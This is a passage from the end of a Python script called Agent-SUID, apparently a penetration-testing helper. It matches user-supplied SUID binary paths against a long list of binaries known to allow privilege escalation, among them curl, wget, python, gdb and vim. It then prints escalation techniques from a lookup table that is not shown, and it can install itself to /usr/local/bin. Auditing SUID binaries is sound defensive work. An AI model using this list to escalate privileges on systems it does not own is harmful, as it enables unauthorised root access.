    "cmp", "column", "comm", "cp", "cpio", "cpulimit", "csh", "csplit", "csvtool", "cupsfilter",
    "curl", "cut", "dash", "date", "dd", "debugfs", "dialog", "diff", "dig", "distcc", "dmsetup",
    "docker", "dosbox", "ed", "efax", "elvish", "emacs", "env", "eqn", "espeak", "expand",
    "expect", "file", "find", "fish", "flock", "fmt", "fold", "gawk", "gcore", "gdb", "genie",
    "genisoimage", "gimp", "grep", "gtester", "gzip", "hd", "head", "hexdump", "highlight",
    "hping3", "iconv", "install", "ionice", "ip", "ispell", "jjs", "join", "jq", "jrunscript",
    "julia", "ksh", "ksshell", "kubectl", "ld.so", "less", "links", "logsave", "look", "lua",
    "make", "mawk", "minicom", "more", "mosquitto", "msgattrib", "msgcat", "msgconv", "msgfilter",
    "msgmerge", "msguniq", "multitime", "mv", "nasm", "nawk", "ncftp", "nft", "nice", "nl", "nm",
    "nmap", "node", "nohup", "ntpdate", "od", "openssl", "openvpn", "pandoc", "paste", "perf",
    "perl", "pexec", "pg", "php", "pidstat", "pr", "ptx", "python", "rc", "readelf", "restic",
    "rev", "rlwrap", "rsync", "rtorrent", "run-parts", "rview", "rvim", "sash", "scanmem", "sed",
    "setarch", "setfacl", "setlock", "shuf", "soelim", "softlimit", "sort", "sqlite3", "ss",
    "ssh-agent", "ssh-keygen", "ssh-keyscan", "sshpass", "start-stop-daemon", "stdbuf", "strace",
    "strings", "sysctl", "systemctl", "tac", "tail", "taskset", "tbl", "tclsh", "tee", "terraform",
    "tftp", "tic", "time", "timeout", "troff", "ul", "unexpand", "uniq", "unshare", "unsquashfs",
    "unzip", "update-alternatives", "uudecode", "uuencode", "vagrant", "varnishncsa", "view",
    "vigr", "vim", "vimdiff", "vipw", "w3m", "watch", "wc", "wget", "whiptail", "xargs", "xdotool",
    "xmodmap", "xmore", "xxd", "xz", "yash", "zsh", "zsoelim"
]


def install_script():
    script_path = os.path.realpath(__file__)
    target_path = "/usr/local/bin/agent-suid"
    if not os.path.exists(target_path):
        shutil.copy(script_path, target_path)
        os.chmod(target_path, 0o755)
        print("Script installed successfully. You can now run 'agent-suid' from anywhere.")
    else:
        print("Script is already installed.")


def uninstall_script():
    script_path = os.path.realpath(__file__)
    target_path = "/usr/local/bin/agent-suid"
    if os.path.exists(target_path):
        os.remove(target_path)
        print("Script uninstalled successfully.")
    else:
        print("Script isn't available")


def main():

    if '--help' in sys.argv:
        display_help()
        return

    if '--install' in sys.argv:
        install_script()
        return

    if '--uninstall' in sys.argv:
        uninstall_script()
        return

    try:

        intro = '''\nAgent-SUID v1.0 by CyberGhoul - the ultimate tool for discovering exploitable SUID binaries on your system. This tool is designed to help security professionals identify potential privilege escalation vectors.
        '''
        print(intro)
        
        print("Enter paths one per line (press Enter on an empty line to finish):\n")
        paths = []
        while True:
            path = input()
            if path == "":
                break
            paths.append(path.strip())


        # Extract the last path
        extracted_names = [os.path.basename(path) for path in paths]
        # Find matches 
        matches = [name for name in extracted_names if name in wordlist]

        # Output the results
        if len(matches) == 1:
           print(f"\nExploitable SUID Binaries Overview: {len(matches)} found")
        else:
           print(f"\nExploitable SUID Binaries Overview: {len(matches)} founds")

        print("Details on privilege escalation techniques:\n")
        for match in matches:
          if match in commands:
            print("-------------------------------------------------")
            print(f"{commands[match]}")
            print("-------------------------------------------------\n")

    except (ValueError, IndexError):
        print("Invalid arguments. Use --help for usage details.")
        return

if __name__ == "__main__":
    main()
